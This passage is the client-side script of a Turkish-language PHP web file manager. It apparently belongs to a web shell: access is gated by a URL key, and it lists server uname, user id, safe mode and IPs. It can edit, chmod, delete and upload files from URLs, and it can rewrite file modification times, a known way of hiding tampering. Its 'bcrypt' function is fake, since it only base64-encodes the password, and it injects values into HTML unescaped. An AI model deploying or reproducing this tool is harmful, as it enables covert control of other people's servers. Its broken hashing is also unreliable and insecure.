            fetch(`?action=get_file_content&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>&file=${encodeURIComponent(fileName)}`)
                .then(response => {
                    if (!response.ok) {
                        return response.json().then(err => { throw new Error(err.error || 'Bilinmeyen Hata'); });
                    }
                    return response.json();
                })
                .then(data => {
                    editor.setValue(data.content, -1);
                    document.getElementById('filePermsDisplay').textContent = data.perms || '-';
                    document.getElementById('fileMTimeDisplay').textContent = data.mtime || '-';
                    const headerFileUrl = document.getElementById('headerFileUrl');
                    headerFileUrl.href = data.url || '#';
                    const fileUrlElement = document.getElementById('fileUrlDisplay');
                    fileUrlElement.href = data.url || '#';
                    fileUrlElement.textContent = data.url || 'URL Yok';
                    editModal.show();
                })
                .catch(error => {
                    editor.setValue('Hata: ' + error.message);
                    alert('Hata: Dosya içeriği yüklenemedi: ' + error.message);
                    editModal.show();
                });
        }
        document.getElementById('editForm').onsubmit = function() {
            if (editor) {
                document.getElementById('fileContent').value = editor.getValue();
            }
            return true;
        };
        function previewImage(url) {
            const modalEl = document.getElementById('previewModal');
            const modalImg = document.getElementById('previewImage');
            modalImg.src = url;
            const modal = new bootstrap.Modal(modalEl);
            modal.show();
        }
        function setSingleActionValues(action) {
            updateFileSelection();
            if (selectedFiles.length !== 1) {
                alert("Lütfen sadece bir dosya seçin!");
                return false;
            }
            const fileName = selectedFiles[0];
            const row = document.querySelector(`tr[data-file-name="${fileName}"]`);
            if (action === 'rename') {
                document.getElementById('renameOldName').value = fileName;
                document.getElementById('renameOldNameDisplay').textContent = fileName;
                document.getElementById('renameNewName').value = fileName;
            } else if (action === 'chmod') {
                const perms = row.getAttribute('data-perms');
                document.getElementById('chmodFileName').value = fileName;
                document.getElementById('chmodFileNameDisplay').textContent = fileName;
                document.getElementById('chmodOldPerms').textContent = perms;
                document.getElementById('chmodNewPerms').value = perms;
            } else if (action === 'touch') {
                const mtime = row.getAttribute('data-mtime');
                document.getElementById('touchFileName').value = fileName;
                document.getElementById('touchFileNameDisplay').textContent = fileName;
                document.getElementById('touchOldMtime').textContent = mtime;
                if (mtime) {
                    const mtimeFormatted = mtime.replace(' ', 'T'); 
                    document.getElementById('touchNewMtime').value = mtimeFormatted;
                }
            } else if (action === 'edit') {
                openEditModal(fileName);
            }
        }
        function setTopluActionValues(action) {
            updateFileSelection();
            if (selectedFiles.length === 0) {
                alert("Lütfen en az bir dosya veya klasör seçin!");
                return false;
            }
            const fileListString = selectedFiles.join(',');
            if (action === 'move') {
                document.getElementById('moveFileCount').textContent = selectedFiles.length;
                document.getElementById('moveFileNames').value = fileListString;
                document.getElementById('moveDestination').value = '';
            } else if (action === 'copy') {
                document.getElementById('copyFileCount').textContent = selectedFiles.length;
                document.getElementById('copyFileNames').value = fileListString;
                document.getElementById('copyDestination').value = '';
            }
        }
        function performTopluAction(action) {
            updateFileSelection();
            if (selectedFiles.length === 0) {
                alert("Lütfen en az bir dosya veya klasör seçin!");
                return;
            }
            let confirmed = true;
            if (action === 'delete') {
                confirmed = confirm(`${selectedFiles.length} dosya/klasör silmek istediğinize emin misiniz?`);
            } 
            if (confirmed || action === 'download_zip' || action === 'directzip' || action === 'download' || action === 'unzip') {
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = `?action=${action}&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>`;
                selectedFiles.forEach(fileName => {
                    const fileInput = document.createElement('input');
                    fileInput.type = 'hidden';
                    fileInput.name = 'files[]';
                    fileInput.value = fileName;
                    form.appendChild(fileInput);
                });
                document.body.appendChild(form);
                form.submit();
            }
        }
        function checkFileUrl() {
            const url = document.getElementById('fileUrlDisplay').getAttribute('href');
            if (!url || url === '#') {
                alert('Bu dosyanın genel erişim URL\'si sunucu tarafından tespit edilemedi.');
                return false;
            }
            return true;
        }
        function copyCurrentPath(path) {
            navigator.clipboard.writeText(path).then(() => {
                showToast('Dizin yolu kopyalandı!', 'success');
            }).catch(() => {
                showToast('Kopyalama başarısız!', 'danger');
            });
        }
        function toggleFolderCreation() {
            const isChecked = document.getElementById('createFolderToggle').checked;
            const folderInputDiv = document.getElementById('folderNameInput');
            if (isChecked) {
                folderInputDiv.style.display = 'block';
            } else {
                folderInputDiv.style.display = 'none';
                document.getElementById('uploadFolderName').value = '';
            }
            document.getElementById('fileUploadFolderFlag').value = isChecked ? 'yes' : 'no';
            document.getElementById('urlUploadFolderFlag').value = isChecked ? 'yes' : 'no';
        }
        document.getElementById('fileUploadForm').addEventListener('submit', function() {
            const folderNameInput = document.getElementById('uploadFolderName');
            if (folderNameInput.style.display === 'block') {
                document.getElementById('fileUploadFolderName').value = folderNameInput.value;
            }
        });
        document.getElementById('urlUploadForm').addEventListener('submit', function() {
            const folderNameInput = document.getElementById('uploadFolderName');
            if (folderNameInput.style.display === 'block') {
                document.getElementById('urlUploadFolderName').value = folderNameInput.value;
            }
        });
        function copyToClipboard(text) {
            navigator.clipboard.writeText(text).then(() => {
                showToast('Kopyalandı!', 'success');
            }).catch(() => {
                showToast('Kopyalama başarısız!', 'danger');
            });
        }
        function showToast(message, type = 'info') {
            const container = document.querySelector('.toast-container');
            const toast = document.createElement('div');
            toast.className = `toast align-items-center text-white bg-${type} border-0`;
            toast.setAttribute('role', 'alert');
            toast.setAttribute('aria-live', 'assertive');
            toast.setAttribute('data-bs-autohide', 'true');
            toast.setAttribute('data-bs-delay', '3000');
            toast.innerHTML = `
                <div class="d-flex">
                    <div class="toast-body">
                        <i class="bi bi-info-circle"></i> ${message}
                    </div>
                    <button type="button" class="btn-close btn-close-white me-2 m-auto" data-bs-dismiss="toast"></button>
                </div>
            `;
            container.appendChild(toast);
            const bsToast = new bootstrap.Toast(toast);
            bsToast.show();
            toast.addEventListener('hidden.bs.toast', () => {
                toast.remove();
            });
        }
        function showServerInfo() {
            const serverInfoContent = document.getElementById('serverInfoContent');
            const serverInfo = <?php 
                $info = getServerInfo();
                $hddUsed = $info['hdd_total'] - $info['hdd_free'];
                $hddPercent = $info['hdd_total'] > 0 ? round(($hddUsed / $info['hdd_total']) * 100) : 0;
                $hddFreePercent = 100 - $hddPercent;
                echo json_encode([
                    'uname' => $info['uname'],
                    'user_id' => $info['user_id'],
                    'php_version' => $info['php_version'],
                    'safe_mode' => $info['safe_mode'],
                    'server_ip' => $info['server_ip'],
                    'client_ip' => $info['client_ip'],
                    'datetime' => $info['datetime'],
                    'hdd_total' => formatSize($info['hdd_total']),
                    'hdd_free' => formatSize($info['hdd_free']),
                    'hdd_percent' => $hddPercent,
                    'hdd_free_percent' => $hddFreePercent
                ]);
            ?>;
            let html = `
                <div class="server-info-list">
                    <div class="info-row mb-3">
                        <i class="bi bi-terminal"></i> <strong>Sistem:</strong><br>
                        <small class="text-muted">${serverInfo.uname}</small>
                    </div>
                    <div class="info-row mb-3">
                        <i class="bi bi-person-circle"></i> <strong>Kullanıcı:</strong> ${serverInfo.user_id}
                    </div>
                    <div class="info-row mb-3">
                        <i class="bi bi-code-slash"></i> <strong>PHP Versiyonu:</strong> ${serverInfo.php_version}
                    </div>
                    <div class="info-row mb-3">
                        <i class="bi bi-shield-lock"></i> <strong>Safe Mode:</strong> ${serverInfo.safe_mode}
                    </div>
                    <hr>
                    <div class="info-row mb-3">
                        <i class="bi bi-globe"></i> <strong>Sunucu IP:</strong> ${serverInfo.server_ip}
                    </div>
                    <div class="info-row mb-3">
                        <i class="bi bi-pc-display"></i> <strong>Sizin IP:</strong> ${serverInfo.client_ip}
                    </div>
                    <hr>
                    <div class="info-row mb-3">
                        <i class="bi bi-clock"></i> <strong>Tarih/Saat:</strong> ${serverInfo.datetime}
                    </div>
                    <hr>
                    <div class="info-row mb-3">
                        <i class="bi bi-hdd"></i> <strong>Disk Alanı:</strong><br>
                        <small>Toplam: ${serverInfo.hdd_total}</small><br>
                        <small>Boş: ${serverInfo.hdd_free} (${serverInfo.hdd_free_percent}%)</small><br>
                        <div class="progress mt-2" style="height: 20px;">
                            <div class="progress-bar bg-success" style="width: ${serverInfo.hdd_free_percent}%;" title="Boş Alan">
                                ${serverInfo.hdd_free_percent}%
                            </div>
                            <div class="progress-bar bg-warning" style="width: ${serverInfo.hdd_percent}%;" title="Kullanılan Alan">
                                ${serverInfo.hdd_percent}%
                            </div>
                        </div>
                    </div>
                </div>
            `;
            serverInfoContent.innerHTML = html;
            const modalEl = document.getElementById('serverInfoModal');
            let serverModal = bootstrap.Modal.getInstance(modalEl);
            if (!serverModal) {
                serverModal = new bootstrap.Modal(modalEl);
            }
            serverModal.show();
        }
        function generateRandomString() {
            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789./';
            let result = '';
            for (let i = 0; i < 22; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }
        function generateBcryptHash(password) {
            const salt = '$2y$10$' + generateRandomString();
            const hashedPassword = salt + btoa(password).substring(0, 43).replace(/\+/g, '.').replace(/\//g, '.');
            return hashedPassword;
        }
        function updateBcrypt() {
            const input = document.getElementById('encryptInput').value;
            const results = document.getElementById('hashResults');
            if (!input) {
                results.innerHTML = '';
                return;
            }
            results.innerHTML = '';
            const md5Hash = CryptoJS.MD5(input).toString();
            const sha1Hash = CryptoJS.SHA1(input).toString();
            const hashes = [
                { name: 'MD5', value: md5Hash },
                { name: 'MD5 (SHA1)', value: CryptoJS.MD5(sha1Hash).toString() },
                { name: 'SHA1', value: sha1Hash },
                { name: 'SHA1 (MD5)', value: CryptoJS.SHA1(md5Hash).toString() },
                { name: 'SHA256', value: CryptoJS.SHA256(input).toString() },
                { name: 'SHA512', value: CryptoJS.SHA512(input).toString() },
                { name: 'SHA3-256', value: CryptoJS.SHA3(input, { outputLength: 256 }).toString() },
                { name: 'SHA3-512', value: CryptoJS.SHA3(input, { outputLength: 512 }).toString() },
                { name: 'RIPEMD160', value: CryptoJS.RIPEMD160(input).toString() },
                { name: 'bcrypt', value: generateBcryptHash(input) } 
            ];
            hashes.forEach(hash => {
                const div = document.createElement('div');
                div.className = 'hash-result';
                div.innerHTML = `
                    <div>
                        <strong>${hash.name}:</strong><br>
                        <code>${hash.value}</code>
                    </div>
                    <button class="btn btn-sm btn-primary" onclick="copyToClipboard('${hash.value}')">
                        <i class="bi bi-clipboard"></i>
                    </button>
                `;
                results.appendChild(div);
            });
        }
        function generateHashes() {
            updateBcrypt();
        }
        function updateFileSelection() {
            const checkboxes = document.querySelectorAll('input[name="file[]"]:checked');
            selectedFiles = Array.from(checkboxes)
                .map(cb => cb.value)
                .filter(val => val !== '..');
            const selectAllCheckbox = document.getElementById('selectAll');
            const allCheckboxes = document.querySelectorAll('input[name="file[]"]');
            const allChecked = Array.from(allCheckboxes).every(cb => cb.value === '..' || cb.checked);
            selectAllCheckbox.checked = allChecked && allCheckboxes.length > 1;
        }
        function toggleFileSelection() {
            const selectAllCheckbox = document.getElementById('selectAll');
            const checkboxes = document.querySelectorAll('input[name="file[]"]');
            checkboxes.forEach(cb => {
                if (cb.value !== '..') {
                    cb.checked = selectAllCheckbox.checked;
                }
            });
            updateFileSelection();
        }
        function performSearch() {
            clearTimeout(searchTimeout);
            searchTimeout = setTimeout(() => {
                const searchValue = document.getElementById('searchInput').value;
                if (searchValue.length > 1 || searchValue.length === 0) { 
                    document.getElementById('searchForm').submit();
                }
            }, 300);
        }
        <?php if ($fileToEdit) { ?>
        setTimeout(() => {
            openEditModal('<?php echo addslashes($fileToEdit); ?>');
        }, 500);
        <?php } ?>
    </script>
</body>
</html>